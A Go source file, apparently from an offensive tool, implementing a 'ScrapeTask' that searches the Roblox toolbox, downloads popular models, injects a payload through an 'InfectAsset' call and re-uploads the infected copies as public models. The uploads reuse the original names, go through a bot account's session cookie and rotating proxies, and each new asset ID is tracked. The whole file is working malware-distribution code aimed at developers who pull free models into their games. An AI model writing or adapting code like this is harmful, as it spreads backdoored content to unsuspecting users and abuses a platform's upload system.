package core

import (
	"bytes"
	"fmt"
	"github.com/google/gxui/math"
	ui "kekops/termui/v3"
	. "kekops/ui"
	gomath "math"
	"math/rand"
	"net/http"
	gourl "net/url"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

type ScrapeTask struct {
	BaseTask

	Offset uint64
	Creator bool

	Goal  uint64
	Count uint64
}

func (b *ScrapeTask) Execute() {
	dest := fmt.Sprintf("%s", b.TDestination)
	Console.Log(CATEGORY_OPERATIONS, LOG_TRACE, dest)
	suggestions := <-FetchSuggestions(dest)
	var search *ToolboxSearch
	if !b.Creator {
		search = <-SearchToolbox(dest, int(b.Goal))
	} else {
		search = <-SearchToolboxCreator(dest, int(b.Goal))
	}

	var description string = dest + " "
	for _, suggest := range suggestions.Data {
		description += suggest.Query + " "
	}
	description = description[0:math.Min(len(description), 1000)]

	mm := Operations.GetMainModule()
	for {
		if b.Count >= b.Goal || b.Cancel == true {
			b.Cancel = true
			break
		}

		log := Console.Log(CATEGORY_OPERATIONS, LOG_INFO, fmt.Sprintf("Querying toolbox offset %d...", b.Count))
		if search == nil {
			log.Update("[Failed to execute search query.](fg:red)")
			return
		}
		if len(search.Data) == 0 {
			log.Update("[Query returned no results.](fg:red)")
			return
		}
		result := search.Data[0+b.Count]
		info := <-FetchProductInfo(strconv.Itoa(result.ID))
		if strings.Contains(info.Name, "#") {
			atomic.AddUint64(&b.Count, 1)
			continue
		}
		log.Update(fmt.Sprintf("[Found toolbox asset %d by %s](fg:green)", result.ID, info.Creator.Name))
		log = Console.Log(CATEGORY_OPERATIONS, LOG_INFO, "Fetching asset...")
		asset := <-FetchAsset(fmt.Sprintf("%d", result.ID))
		if len(asset) == 0 {
			log.Update("[Asset fetch failed.](fg:red)")
			return
		}
		log.Update(fmt.Sprintf("Fetching asset... [%d bytes](fg:green)", len(asset)))
		infected := Operations.InfectAsset(IMPORT_MODEL, asset, mm)
		if len(infected) == 0 {
			return
		}

		if b.Creator {
			description = strings.Fields(info.Name)[0] + " "
			suggestions = <-FetchSuggestions(description)
			if suggestions != nil {
				for _, suggest := range suggestions.Data {
					description += suggest.Query + " "
				}
				description = description[0:math.Min(len(description), 1000)]
			}
		}

		//account := CookieManager.Account()
		xsrf := <-FetchXsrf(BotHolder)

		url := "https://data.roblox.com/Data/Upload.ashx?"
		url += "assetId=0&"
		url += "type=Model&"
		url += "name=" + gourl.QueryEscape(info.Name) + "&"
		url += "description=" + gourl.QueryEscape(description) + "&"
		url += "genreTypeId=0&"
		url += "ispublic=True&"
		url += "allowComments=True&"
		url += "groupId="

		request, _ := http.NewRequest("POST", url, bytes.NewReader(infected))
		request.AddCookie(&http.Cookie{Name: "RBXEventTrackerV2", Value: fmt.Sprintf("browserid=%d", rand.Int31())})
		request.AddCookie(&http.Cookie{Name: ".ROBLOSECURITY", Value: BotHolder})
		request.Header.Add("X-CSRF-TOKEN", xsrf)
		request.Header.Add("User-Agent", UserAgent)

		resp := Proxies[rand.Intn(len(Proxies))].TryRequest(request)
		if assetId, err := strconv.Atoi(resp); err != nil && assetId > 1000 {
			continue
		} else {
			log.Update(fmt.Sprintf("Created asset: [%d](fg:green)", assetId))
			Tracker.AddModel(assetId)
		}

		atomic.AddUint64(&b.Count, 1)
		Gauge.Percent = ui.MinInt(int(gomath.Ceil((float64(atomic.LoadUint64(&b.Count))/float64(b.Goal))*100)), 100)
		ui.Render(Gauge)
		time.Sleep(10 * time.Millisecond)
	}

}

func (b *ScrapeTask) Color() string {
	return "yellow"
}

func (b *ScrapeTask) Type() string {
	return "SCRAPE"
}
